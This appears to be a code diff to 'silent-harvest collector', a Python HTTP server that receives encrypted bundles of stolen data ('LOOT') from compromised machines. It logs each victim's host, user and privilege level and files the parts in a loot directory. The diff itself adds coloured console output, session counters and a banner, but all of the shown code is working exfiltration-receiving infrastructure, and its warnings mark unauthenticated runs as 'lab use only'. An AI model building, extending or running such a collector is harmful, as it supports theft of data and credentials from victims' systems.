@@ -35,10 +35,12 @@ import time
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 import shcrypto
+import term
 
 LOCK = threading.Lock()
 RATE_LOCK = threading.Lock()
 RATE = {}  # ip -> (window_start, count)
+SESSION = {"accepted": 0, "rejected": 0, "denied": 0, "bytes": 0}
 
 
 def rate_limited(ip, limit):
@@ -145,7 +147,10 @@ class Handler(BaseHTTPRequestHandler):
         try:
             manifest, parts = shcrypto.unpack(blob, self.server.psk)
         except ValueError as e:
-            print("[%s] REJECTED bundle: %s" % (time.strftime("%H:%M:%S"), e))
+            with LOCK:
+                SESSION["rejected"] += 1
+            term.cprint("[%s] ✗ REJECTED %s: %s" % (
+                time.strftime("%H:%M:%S"), self.client_address[0], e), term.C.RED)
             self._access("REJECT_BUNDLE", str(e))
             self._reply(400, b"bad bundle\n")
             return
@@ -176,12 +181,30 @@ class Handler(BaseHTTPRequestHandler):
                               for p in manifest["parts"]],
                 }) + "\n")
 
-        print("[%s] LOOT %s  host=%s user=%s elevated=%s  parts=%d  (%d bytes)"
-              % (time.strftime("%H:%M:%S"), vid, v.get("host"), v.get("user"),
-                 v.get("elevated"), len(parts), len(blob)))
-        for p in manifest["parts"]:
-            print("    - %-46s %10d bytes  %s"
-                  % (p["name"], p["len"], json.dumps(p.get("meta", {}))))
+        with LOCK:
+            SESSION["accepted"] += 1
+            SESSION["bytes"] += len(blob)
+        term.cprint("[%s] %s %s  %s@%s%s  parts=%s  %s" % (
+            time.strftime("%H:%M:%S"),
+            term.s("✓ LOOT", term.C.GREEN, term.C.BOLD),
+            term.s(vid, term.C.BOLD),
+            v.get("user"), v.get("host"),
+            term.s(" elev" if str(v.get("elevated")).lower() == "true" else "", term.C.YELLOW),
+            term.s(str(len(parts)), term.C.BOLD),
+            term.s(term.human_size(len(blob)), term.C.CYAN)))
+        names = manifest["parts"]
+        for i, p in enumerate(names):
+            branch = "└─" if i == len(names) - 1 else "├─"
+            meta_obj = p.get("meta") or {}          # may be null in C# manifests
+            meta = json.dumps(meta_obj)
+            method = ""
+            if "method" in meta_obj:
+                method = term.s("  " + meta_obj["method"], term.C.MAGENTA)
+            term.cprint("     %s %-48s %10s  %s%s" % (
+                term.s(branch, term.C.GREY),
+                p["name"], term.s("%d" % p["len"], term.C.CYAN),
+                term.s(meta[:60] + ("…" if len(meta) > 60 else ""), term.C.GREY),
+                method))
         sys.stdout.flush()
         self._access("ACCEPT", "id=%s bytes=%d" % (vid, len(blob)))
         self._reply(200, b"ok\n")
@@ -237,20 +260,39 @@ def main():
 
     srv = Server((args.bind, args.port), Handler)
     srv.psk = psk
-    print("silent-harvest collector on %s:%d  loot -> %s" %
-          (args.bind, args.port, Handler.loot_dir))
-    print("auth: %s  allowlist: %s  max-body: %dMB  rate: %d/min" % (
-        "X-SH-Auth REQUIRED" if args.auth else "NONE (set --auth!)",
-        args.allow or "any (set --allow!)", args.max_body, args.rate))
-    print("PSK: %s" % ("(explicit arg)" if args.psk
-                       else "env SH_PSK / psk.txt / default dev key"))
+    term.init()
+
+    banner = [
+        "%s  %s:%d   loot → %s" % (
+            term.s("bind", term.C.GREY), args.bind, args.port,
+            term.s(Handler.loot_dir, term.C.CYAN)),
+        "%s  %s   %s %s   %s %dMB   %s %d/min" % (
+            term.s("auth", term.C.GREY),
+            term.s("X-SH-Auth REQUIRED", term.C.GREEN) if args.auth
+            else term.s("off (lab mode)", term.C.YELLOW),
+            term.s("allow", term.C.GREY),
+            term.s(args.allow, term.C.GREEN) if args.allow
+            else term.s("any", term.C.YELLOW),
+            term.s("max-body", term.C.GREY), args.max_body,
+            term.s("rate", term.C.GREY), args.rate),
+        "%s  %s" % (term.s("psk ", term.C.GREY),
+                    "(arg)" if args.psk else "env SH_PSK / psk.txt / dev key"),
+    ]
     if not args.auth or not args.allow:
-        print("WARN: running without --auth / --allow is fine on a lab box "
-              "only; internet-facing collectors need both")
+        banner.append(term.s("WARN: no --auth / --allow — lab use only",
+                             term.C.YELLOW, term.C.BOLD))
+    for line in term.box(banner, title="silent-harvest collector", width=68):
+        print(line)
     try:
         srv.serve_forever()
     except KeyboardInterrupt:
         pass
+    print()
+    term.cprint("session summary: %s accepted  %s rejected  %s collected" % (
+        term.s(str(SESSION["accepted"]), term.C.GREEN, term.C.BOLD),
+        term.s(str(SESSION["rejected"]), term.C.RED),
+        term.s(term.human_size(SESSION["bytes"]), term.C.CYAN)),
+        term.C.BOLD)
 
 
 if __name__ == "__main__":
